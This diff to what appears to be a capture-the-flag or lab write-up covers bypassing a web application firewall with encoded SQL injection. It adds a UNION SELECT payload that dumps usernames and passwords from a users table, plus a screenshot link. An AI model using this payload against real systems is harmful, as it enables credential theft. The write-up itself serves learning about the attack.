@@ -10,5 +10,15 @@
 
 *Howerver, WAF will block if we insert UNION. Therefore, we must encoding into hex_intites*
 
+**Payload:**
+```
+sql
+
+1 UNION SELECT username || '~' || password FROM users
+```
+
+
 ## After doing that, we find account admin and password on request board
+
+![Intruder Results](Screenshot%202026-02-25%20213414.png)
 
